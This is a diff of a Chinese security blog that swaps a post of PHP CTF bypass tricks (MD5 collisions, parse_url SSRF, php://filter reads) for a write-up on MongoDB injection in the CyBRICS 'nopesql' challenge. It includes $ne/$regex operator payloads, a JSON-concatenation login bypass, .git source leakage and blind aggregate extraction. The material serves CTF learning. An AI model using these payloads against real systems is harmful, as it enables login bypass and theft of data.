@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="WP,">
+  <meta name="keywords" content="基础,">
 
 
 
@@ -81,29 +81,22 @@
 
 
 
-<meta name="description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
-<meta name="keywords" content="WP">
+<meta name="description" content="mongodb注入cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入">
+<meta name="keywords" content="基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hgame(php)">
-<meta property="og:url" content="http://yoursite.com/2019/02/14/hgame-php/index.html">
+<meta property="og:title" content="mongodb注入">
+<meta property="og:url" content="http://yoursite.com/2019/08/13/mongodb注入/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
+<meta property="og:description" content="mongodb注入cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/2.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/4.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/5.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/6.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/a.png">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/7.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/8.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/12.png">
-<meta property="og:updated_time" content="2019-08-02T09:01:38.615Z">
+<meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/13/mongodb注入/3.png">
+<meta property="og:updated_time" content="2019-08-14T05:28:41.586Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hgame(php)">
-<meta name="twitter:description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
-<meta name="twitter:image" content="http://yoursite.com/2019/02/14/hgame-php/1.jpg">
+<meta name="twitter:title" content="mongodb注入">
+<meta name="twitter:description" content="mongodb注入cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/13/mongodb注入/1.png">
 
 
 
@@ -133,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/14/hgame-php/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/13/mongodb注入/">
 
 
 
 
 
-  <title>hgame(php) | 木偶's blog</title>
+  <title>mongodb注入 | 木偶's blog</title>
   
 
 
@@ -309,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/14/hgame-php/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/mongodb注入/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木偶">
@@ -326,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hgame(php)</h1>
+          <h1 class="post-title" itemprop="name headline">mongodb注入</h1>
         
 
         <div class="post-meta">
@@ -338,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-14T10:07:57+08:00">
-                2019-02-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-13T18:34:25+08:00">
+                2019-08-13
               </time>
             
 
@@ -361,8 +354,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
+                  <a href="/categories/基础/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
                   </a>
                 </span>
 
@@ -379,8 +372,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/02/14/hgame-php/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/02/14/hgame-php/" itemprop="commentCount"></span>
+                <a href="/2019/08/13/mongodb注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/13/mongodb注入/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -402,7 +395,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  657 字
+                  2.2k 字
                 </span>
               
 
@@ -418,7 +411,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  10 分钟
                 </span>
               
             </div>
@@ -439,21 +432,255 @@
       
 
       
-        <p>杭电vidar的hgame，其中几道php的题，写一下学到的。<br><a id="more"></a></p>
-<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p><img src="/2019/02/14/hgame-php/1.jpg" alt=" "></p>
-<p>十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~）  </p>
-<h5 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h5><p><img src="/2019/02/14/hgame-php/2.jpg" alt=" "><br>==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过  </p>
-<h5 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h5><p><img src="/2019/02/14/hgame-php/3.jpg" alt=" "><br>===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见<a href="https://blog.csdn.net/qq_19980431/article/details/83018232）" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232）</a></p>
-<h5 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h5><p><img src="/2019/02/14/hgame-php/4.jpg" alt=" "></p>
-<p>php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里</p>
-<h5 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h5><p><img src="/2019/02/14/hgame-php/5.jpg" alt=" ">  </p>
-<p>数组绕过</p>
-<h5 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h5><p><img src="/2019/02/14/hgame-php/6.jpg" alt=" "><br>这里被难住了，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过<br><img src="/2019/02/14/hgame-php/a.png" alt=" "><br>parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，又有only localhost的提示，这样我们就可以用 http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php 来绕过,从而读取admin.php</p>
-<h5 id="（6）"><a href="#（6）" class="headerlink" title="（6）"></a>（6）</h5><p><img src="/2019/02/14/hgame-php/7.jpg" alt=" "><br>这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits.</p>
-<h5 id="（7）"><a href="#（7）" class="headerlink" title="（7）"></a>（7）</h5><p><img src="/2019/02/14/hgame-php/8.jpg" alt=" "><br>最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h2 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h2><p><img src="/2019/02/14/hgame-php/12.png" alt=" "><br>我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string<br>参数<br>algo：<br>要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。<br>data：<br>要进行哈希运算的消息。<br>key：<br>使用 HMAC 生成信息摘要时所使用的密钥<br>raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。</p>
-<p>当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：<br><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2019</a><br>双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM<br>之后可求gate<br>php&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6”  </p>
-<p>最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1</p>
+        <h2 id="mongodb注入"><a href="#mongodb注入" class="headerlink" title="mongodb注入"></a>mongodb注入</h2><p>cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入</p>
+<a id="more"></a>
+<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>参考链接：<a href="http://www.vuln.cn/6354" target="_blank" rel="noopener">http://www.vuln.cn/6354</a><br>1.用mongo类中相应的方法执行增查减改，传递进入的参数是一个数组：</p>
+<pre><code>&lt;?php
+
+$mongo = new mongoclient();
+
+$db = $mongo-&gt;myinfo; //选择数据库
+
+$coll = $db-&gt;test; //选择集合
+
+$coll-&gt;save();    //增
+
+$coll-&gt;find();    //查
+
+$coll-&gt;remove();    //减
+
+$coll-&gt;update();    //改
+</code></pre><p>2.用execute方法执行字符串 传递进入的参数是query的值：</p>
+<pre><code>#!php
+&lt;?php
+
+$mongo = new mongoclient();
+
+$db = $mongo-&gt;myinfo; //选择数据库
+
+$query = &quot;db.table.save({&apos;newsid&apos;:1})&quot;;    //增
+
+$query = &quot;db.table.find({&apos;newsid&apos;:1})&quot;;    //查
+
+$query = &quot;db.table.remove({&apos;newsid&apos;:1})&quot;;    //减
+
+$query = &quot;db.table.update({&apos;newsid&apos;:1},{&apos;newsid&apos;,2})&quot;;    改
+
+$result = $db-&gt;execute($query);
+</code></pre><h4 id="shell和php"><a href="#shell和php" class="headerlink" title="shell和php"></a>shell和php</h4><pre><code>php语句
+$db-&gt;find([&quot;num&quot;=&gt;[&apos;$gt&apos;=&gt;2],&quot;name&quot;=&gt;&quot;test_3&quot;])
+shell语句
+b.tr1ple.find({&apos;num&apos;:{&quot;$gt&quot;:2},&apos;name&apos;:&apos;test_3&apos;})
+相当于sql语句
+select * from tr1ple where num&gt;2 and name=&quot;test_3&quot;
+</code></pre><h4 id="数组注入"><a href="#数组注入" class="headerlink" title="数组注入"></a>数组注入</h4><pre><code>#!php
+&lt;?php
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo; //选择数据库
+$coll = $db-&gt;test; //选择集合
+$username = $_GET[&apos;username&apos;];
+$password = $_GET[&apos;password&apos;];
+$data = array(
+        &apos;username&apos;=&gt;$username,
+        &apos;password&apos;=&gt;$password
+        );
+$data = $coll-&gt;find($data);
+$count = $data-&gt;count();
+if ($count&gt;0) {
+    foreach ($data as $user) {
+        echo &apos;username:&apos;.$user[&apos;username&apos;].&quot;&lt;/br&gt;&quot;;
+        echo &apos;password:&apos;.$user[&apos;password&apos;].&quot;&lt;/br&gt;&quot;;
+    }
+}
+else{
+    echo &apos;未找到&apos;;
+}
+?&gt;
+</code></pre><p>此时我们传递参数</p>
+<pre><code>?username=test&amp;password=test
+</code></pre><p>相当于执行了查询语句</p>
+<pre><code>db-&gt;test-&gt;find({username:’test’,password:’test’});
+</code></pre><p>并且输出查询的内容<br>而我们要注入的语句是</p>
+<pre><code>?username[$ne]=test&amp;password[$ne]=test
+</code></pre><p>相当于执行了</p>
+<pre><code>db.test.find({username:{‘$ne’:’test’},password:{‘$ne’:’test’}});  
+</code></pre><p>mongodb条件操作符<br>“$lt”, “$lte”, “$gt”, “$gte”, “$ne”对应了  “&lt;”, “&lt;=”, “&gt;”, “&gt;=”,”!=”。<br>相当于对username!=test，password!=test的查询<br>此处是字符的比较，比较的是字符的ascii值</p>
+<pre><code>对应sql语句：select * from test where username!=’test’ and password!=’test’;
+</code></pre><p>返回所有username!=test，password!=test的结果<br>如果读取后并没有回显，我们可以采取$regex操作符来一位一位获取数据。</p>
+<pre><code>传递参数为 username[$regex]=^a
+对应的操作为db.test.find({username:{‘$regex’:’^a’},password:{‘$regex’:’^a’}})
+</code></pre><p>从第一位开始，^a,^a1,^a13 ……</p>
+<h3 id="拼接字符串时的注入"><a href="#拼接字符串时的注入" class="headerlink" title="拼接字符串时的注入"></a>拼接字符串时的注入</h3><pre><code>#!php
+&lt;?php
+$username = $_GET[&apos;username&apos;];
+$password = $_GET[&apos;password&apos;];
+$query = &quot;var data = db.test.findOne({username:&apos;$username&apos;,password:&apos;$password&apos;});return data;&quot;;
+//$query = &quot;return db.test.findOne();&quot;;
+//echo $query;
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo;
+$data = $db-&gt;execute($query);
+if ($data[&apos;ok&apos;] == 1) {
+    if ($data[&apos;retval&apos;]!=NULL) {
+        echo &apos;username:&apos;.$data[&apos;retval&apos;][&apos;username&apos;].&quot;&lt;/br&gt;&quot;;
+        echo &apos;password:&apos;.$data[&apos;retval&apos;][&apos;password&apos;].&quot;&lt;/br&gt;&quot;;
+    }else{
+        echo &apos;未找到&apos;;
+    }
+}else{
+    echo $data[&apos;errmsg&apos;];
+}
+?&gt;
+</code></pre><p>和sql中堆叠注入有点像，将前面正常的语句闭合，加,后面的构造的语句依旧可以执行</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>git源码泄露，大佬wp中学到的姿势，虽然它404了，但是我们可以看到.git后面加了/，虚假的404，可以用githack得到源码。<br><img src="/2019/08/13/mongodb注入/1.png" alt=" "></p>
+<pre><code>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。
+
+渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。
+
+工作原理
+
+解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )
+去.git/objects/ 文件夹下下载对应的文件
+zlib解压文件，按原始的目录结构写入源代码
+</code></pre><p>命令：</p>
+<pre><code>python git.py http://173.199.118.226/.git/
+</code></pre><p>得到index.php源码：</p>
+<h4 id="登陆部分："><a href="#登陆部分：" class="headerlink" title="登陆部分："></a>登陆部分：</h4><pre><code>&lt;?php
+require_once __DIR__ . &quot;/vendor/autoload.php&quot;;
+
+function auth($username, $password) {
+    $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;users;
+    $raw_query = &apos;{&quot;username&quot;: &quot;&apos;.$username.&apos;&quot;, &quot;password&quot;: &quot;&apos;.$password.&apos;&quot;}&apos;;
+    $document = $collection-&gt;findOne(json_decode($raw_query));
+    if (isset($document) &amp;&amp; isset($document-&gt;password)) {
+        return true;
+    }
+    return false;
+}
+
+$user = false;
+if (isset($_COOKIE[&apos;username&apos;]) &amp;&amp; isset($_COOKIE[&apos;password&apos;])) {
+    $user = auth($_COOKIE[&apos;username&apos;], $_COOKIE[&apos;password&apos;]);
+}
+
+if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {
+    $user = auth($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);
+    if ($user) {
+        setcookie(&apos;username&apos;, $_POST[&apos;username&apos;]);
+        setcookie(&apos;password&apos;, $_POST[&apos;password&apos;]);
+    }
+}
+
+?&gt;
+</code></pre><p>我们观察到$raw_query处可以进行字符串的拼接： </p>
+<pre><code>构造username:admin password=&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin
+或者password=&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin
+</code></pre><p>将前面语句闭合，并构造了新的查询，用户名为admin，password不为a，就可以返回true从而进行登陆</p>
+<h4 id="查询部分"><a href="#查询部分" class="headerlink" title="查询部分"></a>查询部分</h4><pre><code>&lt;?php if ($user == true): ?&gt;
+
+    Welcome!
+    &lt;div&gt;
+        Group most common news by
+        &lt;a href=&quot;?filter=$category&quot;&gt;category&lt;/a&gt; | 
+        &lt;a href=&quot;?filter=$public&quot;&gt;publicity&lt;/a&gt;&lt;br&gt;
+    &lt;/div&gt;
+
+    &lt;?php
+        $filter = $_GET[&apos;filter&apos;];
+
+        $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news;
+
+        $pipeline = [
+            [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],
+            [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],
+            [&apos;$limit&apos; =&gt; 5],
+        ];
+
+        $filters = [
+            [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]
+        ];
+
+        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));
+    ?&gt;
+
+    &lt;?php if (isset($filter)): ?&gt;
+
+        &lt;?php
+            foreach ($cursor as $category) {
+                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]);
+            }
+        ?&gt;
+
+    &lt;?php endif; ?&gt;
+
+&lt;?php else: ?&gt;
+
+    &lt;?php if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])): ?&gt;
+        Invalid username or password
+    &lt;?php endif; ?&gt;
+
+    &lt;form action=&apos;/&apos; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;
+        &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
+        &lt;input type=&quot;submit&quot;&gt;
+    &lt;/form&gt;
+
+    &lt;h2&gt;News&lt;/h2&gt;
+    &lt;?php
+        $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news;
+        $cursor = $collection-&gt;find([&apos;public&apos; =&gt; 1]);
+        foreach ($cursor as $news) {
+            printf(&quot;%s&lt;br&gt;&quot;, $news[&apos;title&apos;]);
+        }
+    ?&gt;
+
+&lt;?php endif; ?&gt;
+</code></pre><p>MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果,有点类似sql语句中的count(*)。MongoDB的管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的，以下是几个管道相关操作中的表达式：<br>  $project:修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档，可以把它当作指定域，因为默认find()函数将范围集合中所有的域的数据(可以把它当作SQL里面的字段来理解)。<br>  $limit:用来限制MongoDB聚合管道返回的文档数。<br>  $group:将集合中的文档分组，可用于统计结果。<br>  $sort:将输入文档排序后输出。(使用1和-1来指定排序的方式,其中1为升序排列,而-1是用于降序排列)  </p>
+<p>首先我们来理解一下<br>1</p>
+<pre><code>$pipeline = [
+            [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],
+            [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],//降序输出
+            [&apos;$limit&apos; =&gt; 5],//限制返回文档数为5
+        ];
+&apos;_id&apos; =&gt; &apos;$category&apos;前面的情况出现一次，$sum值+1(如果是=&gt;2的话+2)，并赋值给count
+
+{ $group: { _id：&quot;$分组字段名&quot;, 显示字段名: { 聚集函数: &quot;$字段名&quot;}，[显示字段名2: { 聚集函数: &quot;$字段名&quot;}, ...] } }
+</code></pre><p>2</p>
+<pre><code>$filters = [
+            [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]
+        ];
+对category进行了重命名
+</code></pre><p>3 </p>
+<pre><code>$cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));
+array_merge() 函数把一个或多个数组合并为一个数组。
+</code></pre><p>4</p>
+<pre><code>foreach ($cursor as $category) {
+                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]);}
+将cursor中所有组遍历赋值给category，打印其中_id和count
+</code></pre><p>我们传递filter参数，并把其值作为分组字段，返回各分组信息，当filter=$category ,我们可以看到他输出的结果是</p>
+<pre><code>Welcome! 
+Group most common news by category | publicity
+
+politics has 9 news
+flags has 9 news
+finance has 5 news
+comedy has 5 news
+</code></pre><p>测试发现category还可以是$_id，$text，$title，但是limit的限制没法打印text中的flag</p>
+<h4 id="数组盲注"><a href="#数组盲注" class="headerlink" title="数组盲注"></a>数组盲注</h4><p>需要传递两个参数，而且前后$内容要一致</p>
+<pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=c
+</code></pre><p>相当于</p>
+<pre><code>[&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; [$gt =&gt; [&quot;text&quot;, &quot;c&quot;]]]]
+后面的c为text分组内的内容，所以前后参数都要为$gt
+</code></pre><p>payload是</p>
+<pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=cy
+</code></pre><p>显示<br><img src="/2019/08/13/mongodb注入/2.png" alt=" "></p>
+<pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=cy
+</code></pre><p>则显示<br><img src="/2019/08/13/mongodb注入/3.png" alt=" "></p>
+<p>就可以写脚本得到flag</p>
+<p>得到flag后也可以对此进行验证<br>    ?filter[$ne][0]=$text&amp;filter[$ne][1]=cybrics{7|-|15 15 4 7E&gt;&lt;7 |=|_49}</p>
+<h4 id="拼接字符注入"><a href="#拼接字符注入" class="headerlink" title="拼接字符注入"></a>拼接字符注入</h4><p>在mongodb的aggregate中，可以使用$cond进行条件语句：<br>    [$cond][if][$eq]条件语句</p>
+<pre><code>?filter[$cond][if][$eq][0]=$category&amp;filter[$cond][if][$eq][1]=flags&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category
+</code></pre><p>我们直接输出flag中的text内容，$category和他分组内的内容要在同一数组中</p>
 
       
     </div>
@@ -471,7 +698,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/WP/" rel="tag"># WP</a>
+            <a href="/tags/基础/" rel="tag"># 基础</a>
           
         </div>
       
@@ -484,8 +711,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/02/07/Python爬虫/" rel="next" title="Python爬虫">
-                <i class="fa fa-chevron-left"></i> Python爬虫
+              <a href="/2019/08/13/php反序列化/" rel="next" title="php反序列化">
+                <i class="fa fa-chevron-left"></i> php反序列化
               </a>
             
           </div>
@@ -493,10 +720,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/07/SSTI-1/" rel="prev" title="SSTI(1)">
-                SSTI(1) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -712,7 +935,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-trick"><span class="nav-number">1.</span> <span class="nav-text">php trick</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">（1）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">（2）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（3）"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">（3）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（4）"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">（4）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（5）"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">（5）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（6）"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">（6）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（7）"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">（7）</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#php-is-the-best-language"><span class="nav-number">2.</span> <span class="nav-text">php is the best language</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mongodb注入"><span class="nav-number">1.</span> <span class="nav-text">mongodb注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mongodb"><span class="nav-number">1.1.</span> <span class="nav-text">mongodb</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shell和php"><span class="nav-number">1.1.1.</span> <span class="nav-text">shell和php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数组注入"><span class="nav-number">1.1.2.</span> <span class="nav-text">数组注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拼接字符串时的注入"><span class="nav-number">1.2.</span> <span class="nav-text">拼接字符串时的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">1.3.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#登陆部分："><span class="nav-number">1.3.1.</span> <span class="nav-text">登陆部分：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询部分"><span class="nav-number">1.3.2.</span> <span class="nav-text">查询部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数组盲注"><span class="nav-number">1.3.3.</span> <span class="nav-text">数组盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接字符注入"><span class="nav-number">1.3.4.</span> <span class="nav-text">拼接字符注入</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
